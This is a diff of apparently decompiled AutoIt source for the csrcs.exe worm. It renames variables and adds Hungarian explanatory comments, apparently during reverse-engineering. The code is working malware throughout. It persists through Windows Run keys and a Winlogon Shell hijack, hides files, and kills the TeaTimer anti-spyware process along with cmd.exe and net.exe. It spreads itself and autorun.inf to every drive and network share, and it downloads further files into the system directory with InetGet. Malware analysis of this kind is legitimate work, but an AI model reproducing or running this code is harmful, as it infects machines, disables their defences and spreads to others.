@@ -2346,7 +2346,7 @@ Func Fn009C()
 			If $Var03D9[0] = 3 Then
 				$Var0385 = $Var03D9[1]
 				$Var0386 = $Var03D9[2]
-				If FileGetVersion(@ScriptDir & "\" & $MyExeName) = $Var03D9[3] Then
+				If FileGetVersion(@ScriptDir & "\" & $CSRCSExeName) = $Var03D9[3] Then
 				Else
 					Sleep(0x0190)
 					InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
@@ -2651,7 +2651,7 @@ Func Fn009C()
 					$Var03A8 = $Var03F5[5]
 					$Var03A9 = $Var03F5[6]
 					$Var03F6 = $Var03F5[7]
-					$Var03F7 = FileGetSize(@SystemDir & "\" & $MyExeName)
+					$Var03F7 = FileGetSize(@SystemDir & "\" & $CSRCSExeName)
 					If $Var03F6 = $Var03F7 Then
 						If RegRead($Var029A, $Var03A8) = "1" Or RegRead($Var029A, $Var03A8) = "error" Then
 						Else
@@ -3010,7 +3010,7 @@ Func Fn009E()
 						Else
 							$Var02A8 = $Var02A7
 						EndIf
-						If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $MyExeName) And FileExists($Var0414[$Var0350] & "\" & $AutoRunInfName) Then
+						If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $CSRCSExeName) And FileExists($Var0414[$Var0350] & "\" & $AutoRunInfName) Then
 							$Var0416 = 0
 						Else
 							$Var0416 = 1
@@ -3024,7 +3024,7 @@ Func Fn009E()
 						If $Var0416 = 1 Then
 							$Var0417 = @ScriptDir & "\"
 							$Var0418 = $Var0414[$Var0350] & "\"
-							Fn009D($Var0417, $MyExeName, $Var0418, $Var02A8)
+							Fn009D($Var0417, $CSRCSExeName, $Var0418, $Var02A8)
 							Sleep(10)
 							Fn009D($Var0417, $AutoRunIName, $Var0418, $AutoRunInfName)
 							Sleep(10)
@@ -3104,7 +3104,7 @@ Func Fn009F()
 					Else
 						$Var02A8 = $Var02A7
 					EndIf
-					If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $MyExeName) Then
+					If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $CSRCSExeName) Then
 						$Var0416 = 0
 					Else
 						$Var0416 = 1
@@ -3118,7 +3118,7 @@ Func Fn009F()
 					If $Var0416 = 1 Then
 						$Var0417 = @ScriptDir & "\"
 						$Var0418 = $Var0414[$Var0350] & "\"
-						Fn009D($Var0417, $MyExeName, $Var0418, $Var02A8)
+						Fn009D($Var0417, $CSRCSExeName, $Var0418, $Var02A8)
 						Sleep(10)
 						Fn009D($Var0417, $AutoRunIName, $Var0418, $AutoRunInfName)
 						Sleep(10)
@@ -3145,9 +3145,9 @@ Func Fn009F()
 EndFunc
 
 Func Fn00A0()
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $MyProcessName, "REG_SZ", @SystemDir & "\" & $MyExeName)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $MyProcessName, "REG_SZ", @SystemDir & "\" & $MyExeName)
-	If @OSVersion = "WIN_XP" Then RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", "Explorer.exe " & $MyExeName)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CSRCSProcessName, "REG_SZ", @SystemDir & "\" & $CSRCSExeName)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CSRCSProcessName, "REG_SZ", @SystemDir & "\" & $CSRCSExeName)
+	If @OSVersion = "WIN_XP" Then RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", "Explorer.exe " & $CSRCSExeName)
 	Fn00BE()
 	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", "REG_DWORD", "2")
 	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "SuperHidden", "REG_DWORD", "0")
@@ -3157,11 +3157,11 @@ EndFunc
 
 Func Fn00A1()
 	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $MyProcessName)
-	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $MyProcessName)
-	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $MyProcessName)
+	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CSRCSProcessName)
+	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CSRCSProcessName)
+	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CSRCSProcessName)
 	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", "Explorer.exe")
-	RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List", "C:\WINDOWS\system32\" & $MyExeName)
+	RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List", "C:\WINDOWS\system32\" & $CSRCSExeName)
 	RegDelete($Var029A)
 EndFunc
 
@@ -3174,9 +3174,9 @@ Func Fn00A2()
 		FileSetAttrib(@ScriptDir & "\" & $Var02A7, "-RASHNOT")
 		FileDelete(@ScriptDir & "\" & $Var02A7)
 	EndIf
-	If FileExists(@ScriptDir & "\" & $MyExeName) Then
-		FileSetAttrib(@ScriptDir & "\" & $MyExeName, "-RASHNOT")
-		FileDelete(@ScriptDir & "\" & $MyExeName)
+	If FileExists(@ScriptDir & "\" & $CSRCSExeName) Then
+		FileSetAttrib(@ScriptDir & "\" & $CSRCSExeName, "-RASHNOT")
+		FileDelete(@ScriptDir & "\" & $CSRCSExeName)
 	EndIf
 	If FileExists(@SystemDir & "\" & $AutoRunInfName) Then
 		FileSetAttrib(@SystemDir & "\" & $AutoRunInfName, "-RASHNOT")
@@ -3186,9 +3186,9 @@ Func Fn00A2()
 		FileSetAttrib(@SystemDir & "\" & $Var02A7, "-RASHNOT")
 		FileDelete(@SystemDir & "\" & $Var02A7)
 	EndIf
-	If FileExists(@SystemDir & "\" & $MyExeName) Then
-		FileSetAttrib(@SystemDir & "\" & $MyExeName, "-RASHNOT")
-		FileDelete(@SystemDir & "\" & $MyExeName)
+	If FileExists(@SystemDir & "\" & $CSRCSExeName) Then
+		FileSetAttrib(@SystemDir & "\" & $CSRCSExeName, "-RASHNOT")
+		FileDelete(@SystemDir & "\" & $CSRCSExeName)
 	EndIf
 EndFunc
 
@@ -3217,9 +3217,9 @@ Func Fn00A4()
 					FileSetAttrib($Var041A[$Var0350] & "\" & $Var02A7, "-RASHNOT")
 					FileDelete($Var041A[$Var0350] & "\" & $Var02A7)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $MyExeName) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $MyExeName, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $MyExeName)
+				If FileExists($Var041A[$Var0350] & "\" & $CSRCSExeName) Then
+					FileSetAttrib($Var041A[$Var0350] & "\" & $CSRCSExeName, "-RASHNOT")
+					FileDelete($Var041A[$Var0350] & "\" & $CSRCSExeName)
 				EndIf
 				If FileExists($Var041A[$Var0350] & "\" & $KHYFileName) Then
 					FileSetAttrib($Var041A[$Var0350] & "\" & $KHYFileName, "-RASHNOT")
@@ -3244,9 +3244,9 @@ Func Fn00A5()
 					FileSetAttrib($Var041A[$Var0350] & "\" & $Var02A7, "-RASHNOT")
 					FileDelete($Var041A[$Var0350] & "\" & $Var02A7)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $MyExeName) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $MyExeName, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $MyExeName)
+				If FileExists($Var041A[$Var0350] & "\" & $CSRCSExeName) Then
+					FileSetAttrib($Var041A[$Var0350] & "\" & $CSRCSExeName, "-RASHNOT")
+					FileDelete($Var041A[$Var0350] & "\" & $CSRCSExeName)
 				EndIf
 				If FileExists($Var041A[$Var0350] & "\" & $KHYFileName) Then
 					FileSetAttrib($Var041A[$Var0350] & "\" & $KHYFileName, "-RASHNOT")
@@ -3405,35 +3405,35 @@ Func Fn00A9()
 	Sleep(0x0064)
 	$Var0431 = 0
 	$Var0416 = 1
-	If FileExists($Var0418 & $MyExeName) And FileGetVersion($Var0418 & $MyExeName) > FileGetVersion($Var0417 & $Var02A7) Then
+	If FileExists($Var0418 & $CSRCSExeName) And FileGetVersion($Var0418 & $CSRCSExeName) > FileGetVersion($Var0417 & $Var02A7) Then
 		$Var0416 = 0
-		If Not ProcessExists($MyExeName) Then
-			ShellExecute($MyExeName, "", $Var0418)
+		If Not ProcessExists($CSRCSExeName) Then
+			ShellExecute($CSRCSExeName, "", $Var0418)
 			If @error Then
 			EndIf
 		EndIf
-	ElseIf FileExists($Var0418 & $MyExeName) And FileGetVersion($Var0418 & $MyExeName) = FileGetVersion($Var0417 & $Var02A7) Then
+	ElseIf FileExists($Var0418 & $CSRCSExeName) And FileGetVersion($Var0418 & $CSRCSExeName) = FileGetVersion($Var0417 & $Var02A7) Then
 		$Var0416 = 0
-		If Not ProcessExists($MyExeName) Then
+		If Not ProcessExists($CSRCSExeName) Then
 			$Var0416 = 1
 		EndIf
 	EndIf
 	If $Var0416 = 1 Then
-		If ProcessExists($MyExeName) Then
-			ProcessClose($MyExeName)
+		If ProcessExists($CSRCSExeName) Then
+			ProcessClose($CSRCSExeName)
 			Sleep(0x01F4)
-			If ProcessExists($MyExeName) Then
-				ProcessWaitClose($MyExeName, 0x003C)
+			If ProcessExists($CSRCSExeName) Then
+				ProcessWaitClose($CSRCSExeName, 0x003C)
 			EndIf
 		EndIf
-		Fn009D($Var0417, $Var02A7, $Var0418, $MyExeName)
+		Fn009D($Var0417, $Var02A7, $Var0418, $CSRCSExeName)
 		Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
 		Sleep(10)
-		Fn00B5($Var0418, $MyExeName)
+		Fn00B5($Var0418, $CSRCSExeName)
 		Fn00B5($Var0418, $AutoRunInfName)
 		Sleep(10)
 		RegWrite($Var029A, "ilop", "REG_SZ", "1")
-		ShellExecute($MyExeName, "", $Var0418)
+		ShellExecute($CSRCSExeName, "", $Var0418)
 		If @error Then
 		EndIf
 		Fn00A0()
@@ -3461,21 +3461,21 @@ Func Fn00AA()
 	$Var0431 = 0
 	$Var0416 = 1
 	If $Var0416 = 1 Then
-		If ProcessExists($MyExeName) Then
-			ProcessClose($MyExeName)
+		If ProcessExists($CSRCSExeName) Then
+			ProcessClose($CSRCSExeName)
 			Sleep(0x07D0)
-			If ProcessExists($MyExeName) Then
-				ProcessWaitClose($MyExeName, 0x003C)
+			If ProcessExists($CSRCSExeName) Then
+				ProcessWaitClose($CSRCSExeName, 0x003C)
 			EndIf
 		EndIf
-		Fn009D($Var0417, $Var02A7, $Var0418, $MyExeName)
-		Fn00B5($Var0418, $MyExeName)
+		Fn009D($Var0417, $Var02A7, $Var0418, $CSRCSExeName)
+		Fn00B5($Var0418, $CSRCSExeName)
 		Sleep(10)
 		Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
 		Fn00B5($Var0418, $AutoRunInfName)
 		Sleep(10)
 		RegWrite($Var029A, "ilop", "REG_SZ", "1")
-		ShellExecute($MyExeName, "", $Var0418)
+		ShellExecute($CSRCSExeName, "", $Var0418)
 		If @error Then
 		EndIf
 		Fn00A0()
@@ -3947,18 +3947,18 @@ Func Fn00B0($Arg00)
 						If FileExists($Var0418 & "System Volume Information") Or FileExists($Var0418 & "RECYCLER") Or FileExists($Var0418 & "Recycled") Then
 							Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
 							Sleep(10)
-							Fn009D($Var0417, $MyExeName, $Var0418, $Var02A7)
+							Fn009D($Var0417, $CSRCSExeName, $Var0418, $Var02A7)
 							Sleep(10)
 							$Var02C8 = "todrive"
 						Else
-							Fn009D($Var0417, $MyExeName, $Var0418, $Var02A7)
+							Fn009D($Var0417, $CSRCSExeName, $Var0418, $Var02A7)
 							FileSetAttrib($Var0418 & $Var02A7, "-RASH")
 							Sleep(10)
 							$Var02C8 = "toshare"
 						EndIf
 						FileWrite($Var0418 & $KHYFileName, "")
 						FileSetAttrib($Var0418 & $KHYFileName, "+RASH")
-						If FileExists($Var0418 & $Var02A7) And FileGetVersion($Var0418 & $Var02A7) = FileGetVersion($Var0417 & $MyExeName) Then
+						If FileExists($Var0418 & $Var02A7) And FileGetVersion($Var0418 & $Var02A7) = FileGetVersion($Var0417 & $CSRCSExeName) Then
 							$Var034E = $Var0336
 							$Var02CA = $Var0418
 							$Var02CB = "none"
@@ -5433,10 +5433,12 @@ Opt("TrayMenuMode", 1)
 ; ablak címének beállítása egy 8 és 20 közötti véletlen egész számra
 AutoItWinSetTitle(Fn00BA(Random(8, 0x0014, 1)))
 
-$ExeName1 = "cftuon.exe"
-$ProcessName1 = "cftuon"
-$ExeName2 = "cftu.exe"
-$ProcessName2 = "cftu"
+$CFTUONExeName = "cftuon.exe"
+$CFTUONProcessName = "cftuon"
+$CFTUExeName = "cftu.exe"
+$CFTUProcessName2 = "cftu"
+
+; ha valamelyik meghajtó gyökerében fut
 If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or
    @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or
    @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
@@ -5453,11 +5455,13 @@ If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir 
 EndIf
 
 ; ha a Windows\System32 mappából fut, akkor "c9d5s169d5f19581g19s8g1g" névvel hoz létre mutex-et
-If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName1 Then
+If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeName Then
 	If CreateMutex("c9d5s169d5f19581g19s8g1g", 1) = 0 Then
 		Exit
 	EndIf
 EndIf
+
+; ellenőrzi, hogy már futott-e
 If FileExists("95a1sd.xx") Then
 	$RunnableScript = FileRead("95a1sd.xx")
 	; @AutoItExe = az aktuálisan futó AutoIt script elérési útja és fájlneve
@@ -5469,11 +5473,11 @@ EndIf
 
 ; nem használt változó
 ;$Var0291 = "alokium.exe"
-$MyExeName = "csrcs.exe"
+$CSRCSExeName = "csrcs.exe"
 $AutoRunInfName = "autorun.inf"
 $AutoRunIName = "autorun.i"
 $AutoRunInName = "autorun.in"
-$MyProcessName = "csrcs"
+$CSRCSProcessName = "csrcs"
 $KHYFileName = "khy"
 $MyScriptName = "csrcs.au3"
 $NTRunScriptName = "NTrun.au3"
@@ -5586,72 +5590,83 @@ $Var033B = ""
 $Var033C = ""
 $Var033D = ""
 $Var033E = ""
-If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName2 Then
-	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName2, "REG_SZ", @SystemDir & "\" & $ExeName2)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName2, "REG_SZ", @SystemDir & "\" & $ExeName2)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName2, "REG_SZ", @SystemDir & "\" & $ExeName2)
-	If ProcessExists($MyExeName) Then
-		ProcessClose($MyExeName)
-		Sleep(0x01F4)
-		If ProcessExists($MyExeName) Then
-			ProcessWaitClose($MyExeName, 0x003C)
+
+; ha a script cftu.exe névvel fut a Windows\System32 mappában
+If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUExeName Then
+	; TeaTimer.exe bezárása
+  ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+  ProcessClose("TeaTimer.exe")
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUProcessName2, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUProcessName2, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUProcessName2, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
+
+  ; csrcs.exe bezására (ne fusson két példány)
+	If ProcessExists($CSRCSExeName) Then
+		ProcessClose($CSRCSExeName)
+		Sleep(0x01F4) ; 500 ms = 0,5 s
+		If ProcessExists($CSRCSExeName) Then
+			ProcessWaitClose($CSRCSExeName, 0x003C) ; 60 ms = 0,06 s
 		EndIf
 	EndIf
-	If ProcessExists("cmd.exe") Then
+
+	; parancssor bezárása
+  If ProcessExists("cmd.exe") Then
 		ProcessClose("cmd.exe")
-		Sleep(0x01F4)
+		Sleep(0x01F4) ; 500 ms = 0,5 s
 		If ProcessExists("cmd.exe") Then
-			ProcessWaitClose("cmd.exe", 0x003C)
+			ProcessWaitClose("cmd.exe", 0x003C) ; 60 ms = 0,06 s
 		EndIf
 	EndIf
-	If ProcessExists("net.exe") Then
+
+	; net.exe bezárása
+  If ProcessExists("net.exe") Then
 		ProcessClose("net.exe")
-		Sleep(0x01F4)
+		Sleep(0x01F4) ; 500 ms = 0,5 s
 		If ProcessExists("net.exe") Then
-			ProcessWaitClose("net.exe", 0x003C)
+			ProcessWaitClose("net.exe", 0x003C) ; 60 ms = 0,06 s
 		EndIf
 	EndIf
+
 	Fn00A4()
 	Fn00A2()
-	$Var02A7 = $ExeName2
+	$Var02A7 = $CFTUExeName
 	Fn00AA()
 	Sleep(10 * 0x03E8)
 	Sleep(10 * 0x003C * 0x03E8)
-	If ProcessExists($MyExeName) Then
-		If FileGetVersion(@SystemDir & "\" & $ExeName2) <= FileGetVersion(@SystemDir & "\" & $MyExeName) Then
+	If ProcessExists($CSRCSExeName) Then
+		If FileGetVersion(@SystemDir & "\" & $CFTUExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
 			If RegRead($Var029A, "exp1") <> "" Then
 				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName2)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName2)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName2)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUProcessName2)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUProcessName2)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUProcessName2)
 				Fn00A3()
 			EndIf
 		EndIf
 	EndIf
 	Exit
 EndIf
-If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName1 Then
+If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeName Then
 	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName1, "REG_SZ", @SystemDir & "\" & $ExeName1)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName1, "REG_SZ", @SystemDir & "\" & $ExeName1)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName1, "REG_SZ", @SystemDir & "\" & $ExeName1)
-	If ProcessExists($MyExeName) Then
-		If FileGetVersion(@SystemDir & "\" & $ExeName1) <= FileGetVersion(@SystemDir & "\" & $MyExeName) Then
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName, "REG_SZ", @SystemDir & "\" & $CFTUONExeName)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUONProcessName, "REG_SZ", @SystemDir & "\" & $CFTUONExeName)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName, "REG_SZ", @SystemDir & "\" & $CFTUONExeName)
+	If ProcessExists($CSRCSExeName) Then
+		If FileGetVersion(@SystemDir & "\" & $CFTUONExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
 			If RegRead($Var029A, "exp1") <> "" Then
 				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName1)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName1)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName1)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUONProcessName)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName)
 				Fn00A3()
 			EndIf
 		EndIf
 	EndIf
-	If ProcessExists($MyExeName) Then
-		ProcessClose($MyExeName)
+	If ProcessExists($CSRCSExeName) Then
+		ProcessClose($CSRCSExeName)
 		Sleep(0x01F4)
-		If ProcessExists($MyExeName) Then
-			ProcessWaitClose($MyExeName, 0x003C)
+		If ProcessExists($CSRCSExeName) Then
+			ProcessWaitClose($CSRCSExeName, 0x003C)
 		EndIf
 	EndIf
 	If ProcessExists("cmd.exe") Then
@@ -5670,17 +5685,17 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName1 Th
 	EndIf
 	Fn00A4()
 	Fn00A2()
-	$Var02A7 = $ExeName1
+	$Var02A7 = $CFTUONExeName
 	Fn00A9()
 	Sleep(10 * 0x03E8)
 	Sleep(10 * 0x003C * 0x03E8)
-	If ProcessExists($MyExeName) Then
-		If FileGetVersion(@SystemDir & "\" & $ExeName1) <= FileGetVersion(@SystemDir & "\" & $MyExeName) Then
+	If ProcessExists($CSRCSExeName) Then
+		If FileGetVersion(@SystemDir & "\" & $CFTUONExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
 			If RegRead($Var029A, "exp1") <> "" Then
 				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $ProcessName1)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $ProcessName1)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $ProcessName1)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUONProcessName)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName)
 				Fn00A3()
 			EndIf
 		EndIf
@@ -5699,9 +5714,9 @@ If @ScriptDir = @SystemDir Then
 	$Var02A8 = $Var02A7
 EndIf
 If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
-	$Var0340 = FileGetVersion(@SystemDir & "\" & $MyExeName)
+	$Var0340 = FileGetVersion(@SystemDir & "\" & $CSRCSExeName)
 	$Var0341 = FileGetVersion(@AutoItExe)
-	If ProcessExists($MyExeName) Then
+	If ProcessExists($CSRCSExeName) Then
 		If $Var0341 > $Var0340 Then
 			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
 			$Var02A7 = StringMid(@AutoItExe, $Var0342)
@@ -5721,7 +5736,7 @@ If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir 
 	EndIf
 ElseIf @ScriptDir = @SystemDir Then
 	Sleep(2 * 0x003C * 0x03E8)
-	If @ScriptFullPath = (@SystemDir & "\" & $MyExeName) Or @ScriptFullPath = (@SystemDir & "\" & $MyScriptName) Then
+	If @ScriptFullPath = (@SystemDir & "\" & $CSRCSExeName) Or @ScriptFullPath = (@SystemDir & "\" & $MyScriptName) Then
 	Else
 		Fn00A3()
 	EndIf
@@ -5777,9 +5792,9 @@ ElseIf @ScriptDir = @SystemDir Then
 		Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
 	EndIf
 Else
-	$Var0340 = FileGetVersion(@SystemDir & "\" & $MyExeName)
+	$Var0340 = FileGetVersion(@SystemDir & "\" & $CSRCSExeName)
 	$Var0341 = FileGetVersion(@AutoItExe)
-	If ProcessExists($MyExeName) Then
+	If ProcessExists($CSRCSExeName) Then
 		If $Var0341 > $Var0340 Then
 			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
 			$Var02A7 = StringMid(@AutoItExe, $Var0342)
